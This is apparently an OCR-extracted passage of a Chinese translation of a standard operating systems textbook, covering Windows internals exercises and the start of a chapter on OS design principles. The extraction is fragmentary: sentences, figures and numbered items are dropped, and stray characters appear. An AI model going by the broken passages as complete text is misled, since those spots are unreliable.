实际的设备用设备对象来代表，设备对象可以 根据系统的配置描述来创建，或者由即插即用管理器按照它在枚举系统总线时所发现的设备创建。
设备 组织成一个栈，I/O 请求包沿着栈向下传递并被每个设备的驱动程序处理。
I/O 具有内在的异步性，驱动程 序程序通常将请求排队以便后续处理然后返回到调用者。
文件系统卷作为I/O系统中的设备实现。
NTFS文件系统基于一个主文件表，每个文件或者目录在表中有一条记录。
NTFS 文件系统的所有元
习题
1. 给出注册文件和单个.ini文件的一个优势和一个 劣势。
2.鼠标可包含一个、两个或三个按钮，三种类型 都可用。
HAL 是否在操作系统的其他地方隐藏 了这个差异?
为什么?
3.HAL 可以跟踪从1601年开始的所有时间。
举一 个例子，说明这项功能的用途。
4.在11.3.3节，我们介绍了在多线程应用程序中一 个线程关闭了句柄而另一个线程仍然在使用它 们所造成的问题。
解决此问题的一种可能性是 插入序列域。
请问该方法是如何起作用的?
需 要对系统做哪些修改?
5.执行文件中的许多部分(图11-11)都调用了文 件中的其他部分，举出某一部分调用另外一部 分的三个例子，总共是六部分。
6.Win32 系统没有信号功能。
如果要引入此功能， 我们可以将信号设置为进程所有，线程所有， 两者都有或者两者都没有。
试着提出一项建议， 并解释为什么。
8. 在Windows 中线程拥有独立的用户态栈和内核 态栈的原因是哪些?
9.TLB 对性能有重大的影响。
为了提高TLB的 有 效 性 ，Windows 使用了大小为2MB的页，这是 什么?
为什么2MB的页面没有一直使用?
10.在一个执行体对象上可定义的不同操作的数量 有没有限制?
如果有，这个限制从何而来?
如 果没有，请说明为什么。
11.Win32 API的调用WaitForMultipleObjects 以 一组同步对象的句柄为参数，使得线程被这组 同步对象阻塞。
一旦它们中的任何一个收到信 号，调用者线程就会被释放。
这组同步对象是 否可以包含两个信号灯、一个互斥体和一个临
界区?
理由是什么?
提示：这不是一个恶作剧 的问题，但确实有必要认真考虑一番。
12.在多线程程序中初始化全局变量的时候，允许 这个变量被两次初始化的竞争条件是一个常见 的程序错误。
为什么会发生这种情况?
Windows 提供了InitOnceExcuteOnce API来阻 止这种情况的发生，它是怎样执行的?
14.用户每次从应用程序切换出去的时候，现代应 用程序都必须要将它们的状态保存到磁盘。
这 样看起来效率比较低，因为用户可能会多次切 换回这个应用程序，然后这个应用程序就简单 地重新启动运行。
操作系统为什么要求应用程 序如此频繁地保存它们的状态，而不是在这个 点上就让它们真正结束运行?
15.如11.4节所述，有一个特殊的句柄表用于为进 程和线程分配ID 。
句柄表的算法通常是分配 第一个可用的句柄(按照后进先出的顺序维护 空闲链表)。
在最新发布的Windows 版本中， 该算法变成了ID 表总是以先进先出的顺序跟 踪空闲链表。
使用后进先出顺序分配进程线 ID 有什么潜在的问题?
为什么.UX 操作系统没 有这个问题?
16.假设时间片配额被设置为20毫秒，当前优先 级为24的线程在配额开始的时候刚开始执行。
突然一个I/O操作完成了并且一个优先级为28 的线程变成就绪状态。
这个线程需要等待多久 才可以使用CPU?
17.在Windows中，当前的优先级总是大于或等于 基本的优先级。
是否在某些情况下当前的优先 级低于基本的优先级也是有意义的?
若有，请 举例。
否则请说明原因。
18.Windows 利用一个叫作AutoBoost 的设施来短 暂地提升拥有高优先级所需要的资源的进程的 优先级，你认为它是怎样工作的?
19.在Windows 中很容易实现一些设施将运行在 内核中的线程临时依附到其他进程的地址空 间。
为什么在用户态却很难实现?
这样做有 何目的?
20.说出两种在重要进程中对线程提供更好的响应 时间的方式?
21即使有很多空闲的可用内存而且内存管理器也 不需要调整工作集，分页系统仍然会经常对磁 盘进行写操作。
为什么?
22.Windows 为现代应用程序交换进程而不是减少它 们的工作集或者给它们换页，为什么这样是更 有效的?
(提示：当磁盘是SSD时区别不大。
)
23.为什么用来访问进程页目录和页表的物理页面 的自身映射数据总是占用同一片8MB的内核虚 拟地址空间(在x86上 ) ?
24.x86 机器既能使用64位的页表项，又能使用32 位的页表项。
.Windows 使用64位的页表项，所 以系统能够访问超过4GB的内存空间。
对于32 位的页表项，自映射在页目录中只用一个页目 录项，因此只占用4MB而不是8MB的地址空 间，为什么会这样?
25.如果保留了一段虚拟地址空间但是没有提交 它，你认为系统会为其创建一个VAD吗?
请证 明你的答案。
26.在图11-34中，哪些转移是由策略决定的，而 不是由系统事件(例如， 一个进程退出并释放 其页面)所强迫的转移?
27.假设一个页面被共享并且同时存在于两个工作 集中。
如果它从一个工作集移出，在图11-34 中它将会到哪里去?
当它从第二个工作集移出 时会发生什么?
28.当进程取消对一个页面的映射时，干净的页会 进行图11-36中的转移(5),那脏的栈页怎样 处理呢?
为什么脏的栈页面被取消映射时不会 被转移到已修改列表中呢?
29.假设一个代表某种类型互斥锁(比如互斥对象) 的分发对象被标记为使用通知事件而不是同步 事件来声明锁被释放。
为什么这样是不好的?
你的回答在多大程度上依赖于锁被持有的时间、 时间片配额的长度和系统是否为多处理器的?
30.为了支持POSIX, 原生NtCreateProcess API允 许复制一个进程以支持fork 。
在 UNIX 中，大 多数时候fork 后面都简单地跟着一个exec 。
Berkeley dump(8S)程序是曾经使用这一方式的 一个例子，它能够从磁盘备份到磁带。
如果磁
带设备中有错误，那么fork 将作为卸载程序检 查点以实现重启。
举出一个Windows 可能使用 NtCreateProcess 来做类似事情的例子。
(提示： 考虑拥有DLL 来执行第三方提供的函数的进 程。
)
31.一个文件存在如下映射。
请给出MFT的行串。
33. 在图11-44b中，最先的两个行串的长度都为8 个块。
你觉得它们长度相等只是偶然的，还 是跟压缩的工作方式有关?
请解释理由。
34. 假如您想创建Windows 的精简版。
在图11-45 中可以取消哪些字段而不削弱系统的安全性?
35.用于改善安全性以防止漏洞持续出现的缓解策 略是非常成功的。
现代的攻击技术是非常复杂 的，经常需要利用出现的多个漏洞来展开有效 攻击，其中一个经常用到的漏洞就是信息泄露。
解释一下攻击者怎样利用信息泄露来“击破” 地址空间的随机分配，从而发动基于面向 return 编程的攻击。
37. 在NUMA机器上，不管何时Windows内存管理 器需要分配物理内存来处理页面失效，它总尝 试从当前线程的理想的处理器的NUMA节点中 获取。
为什么?
如果线程正运行在其他处理器 上呢?
38.系统崩溃时，应用程序可以轻易地从基于卷的 影子副本的备份中恢复，而不是从磁盘状态中 恢复。
请给出几个这样的例子。
39.在某些情况下为了满足安全性的要求需要为进 程提供全零的页面，在11.9节中向进程的堆提 供内存就是这样的一种情况。
请给出一个或者 多个其他需要对页面清零的虚拟内存操作。
41.在当前所有的Windows 发行版本中，regedit 命令可用于导出部分或全部注册表到一个文本 文件。
在一次工作会话中保存注册表若干次， 看看有什么变化。
如果您能够在Windows 中安
装软件或硬件，请找出安装或卸载程序或设备 时注册表有何变化。
42. 写 一 个UNIX 程序，模拟用多个流来写一个 NTFS 文件。
它应能接受一个或多个文件作为 参数，并创建一个输出文件，该文件的一个流 包含所有参数的属性，其他的流包含每个参数 的内容。
然后再写一个程序来报告这些属性和 流并提取出所有的组成成分。
大 阳 国 官
第12章|
Modern Operating Systems,Fourth Edition
操作系统设计
在前面的11章中，我们讨论了许多话题，并且分析了许多与操作系统相关的概念和实例。
但是研究 现有的操作系统不同于设计一个新的操作系统。
在本章中，我们将简述操作系统设计人员在设计与实现 一个新的操作系统时必须要考虑的一些问题和权衡。
有关操作系统设计的三篇经典论文是“Hints for Computer System Design”(计算机系统设计的忠告， Lampson,1984) 、“On Building Systems that Will Fail”(论建造将要失败的系统，Corbató,1991) 和 “End-to-End Arguments in System Design” (系统设计中端到端问题，Saltzer 等人，1984)。
与Brooks 的 著作一样，这三篇论文都极其出色地经受住了岁月的考验，其中的大多数真知灼见在今天仍然像文章首 次发表时一样有价值。
12.1 设计问题的本质
操作系统设计与其说是精确的科学，不如说是一个工程项目。
设置清晰的目标并且满足这些目标非 常困难。
我们将从这些观点开始讨论。
12.1.1 目 标
为了设计一个成功的操作系统，设计人员对于需要什么必须有清晰的思路。
缺乏目标将使随后的决 策非常难于做出。
为了明确这一点，看一看两种程序设计语言PL/I 语言和C语言会有所启发。
PL/I 语言 是IBM公司在20世纪60年代设计的，因为在当时必须支持FORTRAN和COBOL是一件令人讨厌的事，同 时令人尴尬的是，学术界背地里嚷嚷着Algol比这两种语言都要好。
所以IBM设立了一个委员会来创作一 种语言，该语言力图满足所有人的需要，这种语言就是PL/1。
它具有 一 些FORTRAN 的特点、 一些 COBOL的特点和一些Algol的特点。
但是该语言失败了，因为它缺乏统一的愿景。
它只是彼此互相竞争 的功能特性的大杂烩，并且过于笨重而不能有效地编译。
现在来看C语言。
它是一个人(Dennis Ritchie) 为了一个目的(系统程序设计)而设计的。
C 语言 在所有的方面都取得了巨大的成功，因为Ritchie 知道他需要什么,不需要什么。
结果，在面世几十年之 后 ，C 语言仍然在广泛使用。
对于需要什么要有一个清晰的愿景是至关重要的。
1)定义抽象概念。
2)提供基本操作。
3)确保隔离。
4)管理硬件。
下面将描述这些要素。
一个操作系统最重要但可能最困难的任务是定义正确的抽象概念。
有一些抽象概念，例如进程和文
与这一要点密切相关的是需要隔离故障。
如果系统的某一部分崩溃(最为一般的是一个用户进程崩 溃),不应该使系统的其余部分随之崩溃。
系统设计应该确保系统的不同部分良好地相互隔离。
从理想 的角度看，操作系统的各部分也应该相互隔离，以便使故障独立。
操作系统也应该具有容错性和自我恢 复的功能。
最后，操作系统必须管理硬件。
特别地，它必须处理所有低级芯片，例如中断控制器和总线控制器。
它还必须提供一个框架，从而使设备驱动程序得以管理更大型的I/O设备，例如磁盘、打印机和显示器。
12.1.2 设计操作系统为什么困难
摩尔定律表明计算机硬件每十年改进100倍，但却没有一个定律宣称操作系统每十年改进100倍。
甚 至没有人能够宣称操作系统每十年在某种程度上会有所改善。
事实上，可以举出事例， 一些操作系统在 很多重要的方面(例如可靠性)比20世纪70年代的UNIX版本7还要糟糕。
第一，操作系统已经成为极其庞大的程序。
没有一个人能够坐在一台PC 前，用几个月甚至几年时 间完成一个严肃的操作系统。
UNIX 的所有当前版本总共有成百上千万行代码，比如Linux 就有1500万 行代码，Windows 8大概有5000万到1亿行代码(这与统计方式有关；Window Vista有7000万行代码， 但是随着代码的增删会有一些变动)。
没有一个人能够理解几万行代码，更不必说5000万到上亿行代码。
当你拥有一件产品时，如果没有一名设计师能够有望完全理解它，那么结果远谈不上优秀也就不难预 料了。
操作系统不是世界上最复杂的系统，例如，航空母舰就要复杂得多，但是航空母舰能够更好地分成 相互隔离的部分。
设计航空母舰上的卫生间的人员根本不必关心雷达系统，这两个子系统没有什么相互 作用。
没有事例表明航空母舰上一个堵住的卫生间会导致舰艇发射导弹。
而在操作系统中，文件系统经 常以意外和无法预料的方式与内存系统相互作用。
第二，操作系统必须处理并发。
系统中往往存在多个用户和多个设备同时处于活动状态。
管理并发 自然要比管理单一的顺序活动复杂得多。
竞争条件和死锁只是出现的众多问题中的两个。
第三，操作系统必须处理可能有敌意的用户——想要干扰系统的用户或者做不允许做的事情(例如 偷窃另一个用户的文件)的用户。
操作系统需要采取措施阻止这些用户不正当的行为，而字处理程序和 照片编辑程序就不存在这样的问题。
第四，尽管事实上并非所有的用户都相信其他用户，但是许多用户确实希望与经过选择的其他用户 共享他们的信息和资源。
操作系统必须使其成为可能，但是要以确保怀有恶意的用户不能妨害的方式。
而应用程序就不会面对类似这样的挑战。
第五，操作系统已经问世很长时间了。
UNIX 已经历了40年，Windows 面世也已经超过30年并且还没 有消失的迹象。
因此，设计人员必须思考硬件和应用程序在遥远的未来可能会发生何种变化，并且考虑 为这样的变化做怎样的准备。
被锁定在一个特定视野中的系统通常会死亡。
第六，操作系统设计人员对于他们的系统将怎样被人使用实际上并没有确切的概念，所以他们需要 提供相当程度的通用性。
UNIX 和Windows 在设计时都没有把Web浏览器或高清视频播放器放在心上，然 而许多运行这些系统的计算机却很少做其他的事情。
人们在告诉一名轮船设计师建造一艘轮船时，却会 指明他想要的是渔船、游船还是战舰，并且当产品生产出来之后鲜有人会改变产品的用途。
第七，现代操作系统一般被设计成可移植的，这意味着它们必须运行在多个硬件平台上。
它们还必 须支持上千个I/O 设备，所有这些I/O 设备都是独立设计的，彼此之间没有关系。
这样的差异可能会导致 问题，一个例子是操作系统需要运行在小端机器和大端机器上。
第二个例子经常在MS-DOS 下看到，用 户试图安装一块声卡和一个调制解调器，而它们使用了相同的I/O 端口或者中断请求线。
除了操作系统 以外，很少有程序必须处理由于硬件部件冲突而导致的这类问题。
第八，也是最后一个问题，是经常需要与某个从前的操作系统保持向后兼容。
以前的那个系统可能在 字长、文件名或者其他方面有所限制，而在设计人员现在看来这些限制都是过时的，但是却必须坚持。
这 就像让一家工厂转而去生产下一年的汽车而不是这一年的汽车的同时，继续全力地去生产这一年的汽车。
12.2 接口设计
到现在读者应该清楚，编写一个现代操作系统并不容易。
但是人们要从何处开始呢?
可能最好的起 点是考虑操作系统提供的接口。
操作系统提供了一组抽象，主要是数据类型(例如文件)以及其上的操 作 ( 例 如read) 。
它们合起来形成了对用户的接口。
注意，在这一上下文中操作系统的用户是指编写使 用系统调用的代码的程序员，而不是运行应用程序的人员。
除了主要的系统调用接口，大多数操作系统还具有另外的接口。
例如，某些程序员需要编写插入到 操作系统中的设备驱动程序。
这些驱动程序可以看到操作系统的某些功能特性并且能够发出某些过程调 用。
这些功能特性和调用也定义了接口，但是与应用程序员看到的接口完全不同。
如果一个系统要取得 成功，所有这些接口都必须仔细设计。
12.2.1 指导原则
有没有可以指导接口设计的原则呢?
我们认为是有的。
简而言之，原则就是简单、完备和能够有效 地实现。
原则1:简单
如果你很挑剔，觉得他没有这么说过，那么请看原文(法文):
II semble que la perfection soit atteinte non quand il n'y a plus rien à ajouter,mais quand il n'y a plus rien à retrancher.
只要理解这句话，怎么记都无所谓。
这一原则说的是少比多好，至少在操作系统本身中是这样。
这一原则的另一种说法是KISS 原则： Keep It Simple,Stupid (保持简朴无华)。
原则2:完备
当然，接口必须能够做用户需要做的一切事情，也就是说，它必须是完备的。
这使我们想起了另一 条著名的格言， Albert Einstein (阿尔伯特 · 爱因斯坦)说过：
万事都应该尽可能简单，但是不能过于简单。
换言之，操作系统应该不多不少准确地做它需要做的事情。
如果用户需要存储数据，它就必须提供存 储数据的机制；如果用户需要与其他用户通信，操作系统就必须提供通信机制；如此等等。
1991年，CTSS 和MULTICS的设计者之一Fernando Corbató在他的图灵奖演说中，将简单和完备的概念结合起来并且指出：
当然，这些都是内核的调用。
在此之上运行POSIX 兼容的系统，需要实现大量的POSIX 系统调用。
但是它的美丽之处在于这些调用全部都映射到了一个很小的内核调用集合上。
有了这样一个(仍然)如 此简单的系统，我们有机会让它正确运行。
原则3:效率
第三个指导方针是实现的效率。
如果一个功能特性或者系统调用不能够有效地实现，或许就不值得 包含它。
对于程序员来说， 一个系统调用的代价有多大应该是直观的。
例如，UNIX 程序员会认为lseek 系统调用比read系统调用要代价低廉，因为前者只是在内存中修改一个指针，而后者则要执行磁盘I/O。
如果直观的代价是错误的，程序员就会写出效率差的程序。
12.2.2 范 型
首先设计系统调用接口是自底向上的设计。
此时的问题是程序员通常需要哪些种类的功能特性。
实 际上，并不是需要许多特别的功能特性才能支持一个GUI 。
例 如 ，UNIX 窗口系统X只是一个读写键盘、
鼠标和屏幕的大的C 程 序 。
X 是在UNIX问世很久以后才开发的，但是并不要求对操作系统做很多修改就 可以使它工作。
这一经历验证了这样的事实：UNIX是十分完备的。
1.用户界面范型
对于GUI 级的接口和系统调用接口而言，最重要的方面是有一个良好的范型(有时称为隐喻),以 提供观察接口的方法。
台式计算机的许多GUI 使用我们在第5章讨论过的WIMP范型。
该范型在遍及接口 的各处使用定点一点击、定点一双击、拖动以及其他术语，以提供总体上的体系结构一致性。
对于应用 程序常常还有额外的要求，例如要有一个具有文件 (FILE) 、 编 辑 (EDIT) 以及其他条目的菜单栏，每 个条目具有某些众所周知的菜单项。
这样，熟悉一个程序的用户就能够很快地学会另一个程序。
不管选择什么范型，重要的是所有应用程序都要使用它。
因此，系统设计者需要提供库和工具包给 应用程序开发人员，使他们能够访问产生一致的外观与感觉的程序。
没有工具，应用开发者做出来的东 西可能完全不同。
用户界面设计很重要，但它并不是本书的主题，所以我们现在将回到操作系统接口的 主 题 上 。
2. 执行范型
体系结构一致性不但在用户层面是重要的，在系统调用接口层面也同样重要。
在这里区分执行范型 和数据范型常常是有益的，所以我们将讨论两者，我们以前者为开始。
a)
b)
图12-1 a) 算法代码；b) 事件驱动代码
另一种执行范型是图12-1b所示的事件驱动范型(event- driven paradigm)。
在这里程序执行某种初 始化(例如通过显示某个屏幕),然后等待操作系统告诉它第一个事件。
事件经常是键盘敲击或鼠标移 动。
这一设计对于高度交互式的程序是十分有益的。
3.数据范型
执行范型并不是操作系统导出的唯一范型，同等重要的范型是数据范型。
这里关键的问题是系统结 构和设备如何展现给程序员。
在早期的FORTRAN批处理系统中，所有一切都是作为连续的磁带来建立
模型。
用于读入的卡片组被看作输入磁带，用于穿孔的卡片组被看作输出磁带，并且打印机输出被看作 输出磁带。
磁盘文件也被看作磁带。
对一个文件的随机访问是可能的，只要将磁带倒带到对应的文件并 且再次读取就可以了。
使用作业控制卡片可以这样来实现映射：
MOUNT(TAPE08,REEL781)
RUN(INPUT,MYDATA,OUTPUT,PUNCH,TAPE08)
第一张卡片指示操作员去从磁带架上取得磁带卷781,并且将其安装在磁带驱动器8上。
第二张卡片指示 操作系统运行刚刚编译的FORTRAN 程序，映射INPUT (意指卡片阅读机)到逻辑磁带1,映射磁盘文件 MYDATA到逻辑磁带2,映射打印机(称为OUTPUT) 到逻辑磁带3,映射卡片穿孔机(称为PUNCH) 到逻辑磁带4,并且映射物理磁带驱动器8到逻辑磁带5。
FORTRAN 具有读写逻辑磁带的语法。
通过读逻辑磁带1,程序获得卡片输入。
通过写逻辑磁带3, 输出随后将会出现在打印机上。
通过读逻辑磁带5,磁带卷781将被读入，如此等等。
注意，磁带概念只 是集成卡片阅读机、打印机、穿孔机、磁盘文件以及磁带的一个范型。
在这个例子中，只有逻辑磁带5 是一个物理磁带，其余的都是普通的(假脱机)磁盘文件。
这只是一个原始的范型，但它却是正确方向 上的一个开端。
后 来 ，UNIX问世了，它采用“所有一切都是文件”的模型进一步发展了这一思想。
使用这一范型，
所有I/O 设备都被看作文件，并且可以像普通文件一样打开和操作。
C 语句 fd1=open("file1",O_RDWR);
fd2=open("/dev/tty",O_RDWR);
打开一个真正的磁盘文件和用户终端。
随后的语句可以使用fd1和fd2 分别读写它们。
从这一时刻起，在 访问文件和访问终端之间并不存在差异，只不过在终端上寻道是不允许的。
UNIX不但统一了文件和I/O 设备，它还允许像访问文件一样通过管道访问其他进程。
此外，当支持 映射文件时， 一个进程可以得到其自身的虚拟内存，就像它是一个文件一样。
最后，在支持/proc文件系 统的UNIX版本中，C 语句
fd3=open("/proc/501",O_RDWR);
允许进程(尝试)访问进程501的内存，使用文件描述符fd3 进行读和写，这在某种程度上是有益的，例 如对于一个调试器。
统一的范型还出现在其他上下文中，其中在这里值得一提的是Web 。
Web 背后的范型是充满了文档 的超空间，每一个文档具有一个URL 。
通过键入一个URL 或者点击被URL所支持的条目，你就可以得到 该文档。
实际上，许多“文档”根本就不是文档，而是当请求到来时由程序或者命令行解释器脚本生成 的。
例如，当用户询问一家网上商店关于一位特定艺术家的CD 清单时，文档由一个程序即时生成；在 查询未做出之前该文档的确并不存在。
12.2.3 系统调用接口
如果一个人相信Corbató 的机制最少化的格言，那么操作系统应该提供恰好够用的系统调用，并且每 个系统调用都应该尽可能简单(但不能过于简单)。
统一的数据范型在此处可以扮演重要的角色。
例如，
如果文件、进程、I/O 设备以及更多的东西都可以看作文件或者对象，那么它们就都能够用单一的read 系 统调用来读取。
否则，可能就有必要具有read_file 、read_proc 以及read_tty 等单独的系统调用。
在某些情况下，系统调用可能需要若干变体，但是通常比较好的实现是具有处理一般情况的一个系 统调用，而由不同的库过程向程序员隐藏这一事实。
例如，UNIX 具有一个系统调用exec, 用来覆盖一 个进程的虚拟地址空间。
最一般的调用是：
exec(name,argp,envp);
execl(name,arg0,arg1,…,argn,O);
execle(name,arg0,arg1,...,argn,envp);
所有这些过程所做的事情是将参数粘连在一个数组中，然后调用exec 来做具体工作。
这一安排达到了双 赢目的：单一的直接系统调用使操作系统保持简单，而程序员得到了以各种方法调用exec 的便利。
当然，试图拥有一个调用来处理每一种可能的情况很可能难以控制。
在UNIX中，创建一个进程需 要两个调用：fork然后是exec, 前者不需要参数，后者具有3个参数。
相反，创建一个进程的Win API调 用CreateProcess 具有10个参数，其中一个参数是指向一个结构的指针，该结构具有另外18个参数。
简单不是设计系统调用时出现的唯一问题。
一个重要的考虑因素是Lampson(1984) 的口号：
不要隐藏能力。
另一个设计问题是面向连接的调用与无连接的调用。
读文件的标准UNIX系统调用和Windows系统 调用是面向连接的。
首先你要打开一个文件，然后读它，最后关闭它。
某些远程文件访问协议也是面向 连接的。
例如，要使用FTP, 用户首先要登录到远程计算机上，读文件，然后注销。
另一方面，某些远程文件访问协议是无连接的，例如Web协议(HTTP)。
要读一个Web页面你只要 请求它就可以了；不存在事先建立连接的需要 (TCP 连接是需要的，但是这处于协议的低层；HTTP 协 议本身是无连接的)。
任何面向连接的机制与无连接的机制之间的权衡在于建立连接的机制(例如打开文件)要求的额外 开销，以及在后续调用(可能很多)中避免进行连接所带来的好处。
对于单机上的文件I/O 而言，由于 建立连接的代价很低，标准的方法(首先打开，然后使用)可能是最好的方法。
对于远程文件系统而言， 两种方法都可以采用。
与系统调用接口有关的另一个问题是接口的可见性。
POSIX 强制的系统调用列表很容易找到。
所有
UNIX 系统都支持这些系统调用，以及少数其他系统调用，但是完整的列表总是公开的。
相反， Microsoft从未将Windows 系统调用列表公开。
作为替代，Win API和其他API被公开了，但是这些API包 含大量的库调用(超过10000个),只有很少数是真正的系统调用。
将所有系统调用公开的依据是可以 让程序员知道什么是代价低廉的(在用户空间执行的函数),什么是代价昂贵的(内核调用)。
不将它们 公开的依据是这样给实现提供了灵活性，无须破坏用户程序就可以修改实际的底层系统调用，以便使其 工作得更好。
就像9.7.7节说过的那样，最初的设计者弄错了access 系统调用，而现在我们无法摆脱这个 问 题 。
12.3 实现
讨论过用户界面和系统调用接口后，现在让我们来看一看如何实现一个操作系统。
在下面8个小节， 我们将分析涉及实现策略的某些一般的概念性问题。
在此之后，我们将看一看某些低层技术，这些技术 通常是十分有益的。
12.3.1 系统结构
实现必须要做出的第一个决策可能是系统结构应该是什么。
我们在1.7节分析了主要的可能性，在 这里要重温一下。
一个无结构的单块式设计并不是一个好主意，除非可能是用于烤面包片机中的微小的 操作系统，但是即使在这里也是可争论的。
1.分层系统
多年以来很好地建立起来的一个合理的方案是分层系统。
Dijkstra 的THE 系统(图1-25)是第一个
分层操作系统。
UNIX 和Windows 8也具有分层结构， 但是在这两个系统中分层更是一种试图描述系统的 方法，而不是用于建立系统的真正的指导原则。
对于一个新系统，选择走这一路线的设计人员 应该首先非常仔细地选择各个层次，并且定义每个 层次的功能。
底层应该总是试图隐藏硬件最糟糕的 特异性，就像图11-4中HAL 所做的那样。
或许下一 层应该处理中断、上下文切换以及MMU, 从而在这 一层的代码大部分是与机器无关的。
在这一层之上， 不同的设计人员可能具有不同的口味(与偏好)。
一 种可能性是让第3层管理线程，包括调度和线程间同
层次
图12-2 现代层次结构操作系统的一种设计
步，如图12-2所示。
此处的思想是从第4层开始，我们拥有适当的线程，这些线程可以被 正常地调度，并且使用标准的机制(例如互斥量)进行同步。
2.外内核
虽然分层在系统设计人员中间具有支持者，但是还有另一个阵营恰恰持有相反的观点(Engler 等人， 1995)。
他们的观点基于端到端问题 (end-to-end argument;Saltzer等人，1984)。
这一概念是说，如果
某件事情必须由用户程序本身去完成，在一个较低的层次做同样的事情就是浪费。
考虑将该原理应用于远程文件访问。
如果一个系统担心数据在传送中被破坏，它应该安排每个文件 在写的时候计算校验和，并且校验和与文件一同存放。
当一个文件通过网络从源盘传送到目标进程时， 校验和也被传送，并且在接收端重新计算。
如果两者不一致，文件将被丢弃并且重新传送。
端到端问题可以扩展到几乎所有操作系统。
它主张不要让操作系统做用户程序本身可以做的任何事 情。
例如，为什么要有一个文件系统?
只要让用户以一种受保护的方式读和写原始磁盘的一个部分就可 以了。
当然，大多数用户喜欢使用文件，但是端到端问题宣称，文件系统应该是与需要使用文件的任何 程序相链接的库过程。
这一方案使不同的程序可以拥有不同的文件系统。
这一论证线索表明操作系统应 该做的全部事情是在竞争的用户之间安全地分配资源(例如CPU 和磁盘)。
Exokernel 是一个根据端到端 问题建立的操作系统 (Engler 等人，1995)。
器进程发送信息
即使没有硬件帮助可用，仍然可以设法使这一思想可行。
此时需要的是一个新的系统调用，该系统 调用仅对设备驱动程序进程可用，它提供一个(端口，取值)对列表。
内核所做的是首先进行检查以了 解进程是否拥有列表中的所有端口，如果是，它就将相应的取值复制到端口以发起设备I/O 。
类似的调 用可以用来读I/O端口。
这一方法使设备驱动程序避免了检查(并且破坏)内核数据结构，这(在很大程度上)是一件好事 情。
一组类似的调用可以用来让驱动程序进程读和写内核表格，但是仅以一种受控的方式并且需要内核 的批准。
这一方法的主要问题，并且一般而言是针对微内核的主要问题，是额外的上下文切换导致性能受到 影响。
然而，微内核上的所有工作实际上是许多年前当CPU 还非常缓慢的时候做的。
如今，用尽CPU的 处理能力并且不能容忍微小性能损失的应用程序是十分稀少的。
毕竟，当运行一个字处理器或Web浏览 器 时 ，CPU 可能有95%的时间是空闲的。
如果一个基于微内核的操作系统将一个不可靠的3.5GHz的系统 转变为一个可靠的3.0GHz 的系统，可能很少有用户会抱怨。
毕竟，仅仅在几年以前当他们得到具有 1GHz 的速度(就当时而言十分惊人)的系统时，大多数用户是相当快乐的。
同时，当处理器不再是稀
缺资源时，目前尚不清楚进程间通信的开销是否还是一个很大的问题。
如果每个设备驱动、每个操作系 统的构件都有它们自己专用的处理器，那么进程间通信就不需要上下文切换。
此外，高速缓存、分支预 测以及TLB都已经做好准备并且可以全速运行。
Hruby 等人(2013)在基于微内核的高性能操作系统上 做了一些实验。
值得注意的是，虽然微内核在台式机上并不流行，但是在手机、工业系统、嵌入式系统和军事系统 中有着广泛的应用，在这些系统中，高可靠性是绝对必要的。
同时，苹果公司运行在所有Mac 和 Macbook上的OS X系统，都包含一个基于Mach微内核的修改版FreeBSD系统。
4.可扩展的系统
5. 内核线程
此处，另一个相关的问题是系统线程。
无论选择哪种结构模型，允许存在与任何用户进程相隔离的 内核线程是很方便的。
这些线程可以在后台运行，将脏页面写入磁盘，在内存和磁盘之间交换进程，如 此等等。
实际上，内核本身可以完全由这样的线程构成，所以当一个用户发出系统调用时，用户的线程 并不是在内核模式中运行，而是阻塞并且将控制传给一个内核线程，该内核线程接管控制以完成工作。
12.3.2 机制与策略
另一个有助于体系结构一致性的原理是机制与策略的分离，该原理同时还有助于使系统保持小型和 良好的结构。
通过将机制放入操作系统而将策略留给用户进程，即使存在改变策略的需要，系统本身也 可以保持不变。
即使策略模块必须保留在内核中，它也应该尽可能地与机制相隔离，这样策略模块中的 变化就不会影响机制模块。
第二个例子是分页。
机制涉及MMU管理，维护占用页面与空闲页面的列表，以及用来将页面移入磁 盘或者移出磁盘的代码。
策略是当页面故障发生时决定做什么,它可能是局部的或全局的，基于LRU的 或基于FIFO的，或者是别的东西，但是这一算法可以(并且应该)完全独立于管理页面的机制。
第三个例子是允许将模块装载到内核之中。
机制关心的是它们如何被插入、如何被链接、它们可以 发出什么调用，以及可以对它们发出什么调用。
策略确定谁能够将模块装载到内核之中以及装载哪些模 块等。
也许只有超级用户可以装载模块，也许任何用户都可以装载被适当权威机构数字签名的模块。
12.3.3 正交性
良好的系统设计在于单独的概念可以独立地组合。
例如，在C语言中，存在基本的数据类型，包括 整数、字符和浮点数，还存在用来组合数据类型的机制，包括数组、结构体和联合体。
这些概念独立地 组合，允许拥有整数数组、字符数组、浮点数的结构和联合成员等。
实际上， 一旦定义了一个新的数据 类型，如整数数组，就可以如同一个基本数据类型一样使用它，例如作为一个结构或者一个联合的成员。
独立地组合单独的概念的能力称为正交性 (orthogonality), 它是简单性和完整性原理的直接结果。
正交性概念还以各种各样的其他形式出现在操作系统中，Linux的clone 系统调用就是一个例子，它 创建一个新线程。
该调用有一个位图作为参数，它允许单独地共享或复制地址空间、工作目录、文件描 述符以及信号。
如果复制所有的东西，我们将得到一个进程，就像调用fork 一样。
如果什么都不复制， 则是在当前进程中创建一个新线程。
然而，创建共享的中间形式同样也是可以的，而这在传统的UNIX 系统中是不可能的。
通过分离各种特性并且使它们正交，是可以做到更好地控制自由度的。
正交性的另一个应用是Windows 8中进程概念与线程概念的分离。
进程是一个资源容器，既不多也 不少。
线程是一个可调度的实体。
当把另一个进程的句柄提供给一个进程时，它拥有多少个线程都是没 有关系的。
当一个线程被调度时，它从属于哪个进程也是没有关系的。
这些概念是正交的。
12.3.4 命 名
操作系统大多数较长使用的数据结构都具有某种名字或标识符，通过这些名字或标识符就可以引用 这些数据结构。
显而易见的例子有注册名、文件名、设备名、进程ID等。
在操作系统的设计与实现中， 如何构造和管理这些名字是一个重要的问题。
命名经常在外部和内部两个层次上实现。
例如，文件总是具有以ASCI 或Unicode编码的字符串名字以供
人们使用。
此外，几乎总是存 在一个内部名字由系统使用。
在UNIX中，文件的实际名字是 它的i节点号，在内部根本就不 使用ASCII名字。
实际上，它甚 至不是唯一的，因为一个文件 可能具有多个链接指向它。
在 Windows 8中，相仿的内部名字 是MFT 中文件的索引。
目录的 任务是在外部名字和内部名字 之间提供映射，如图12-4所示。
外部名字：
图12-4 目录用来将外部名字映射到内部名字上
在许多情况下(例如上面给出的文件名的例子),内部名字是一个无符号整数，用作进入一个内部 表格的索引。
表格一索引名字的其他例子还有UNIX中的文件描述符和Windows 8中的对象句柄。
注意这 些都没有任何外部表示，它们严格地被系统和运行的进程所使用。
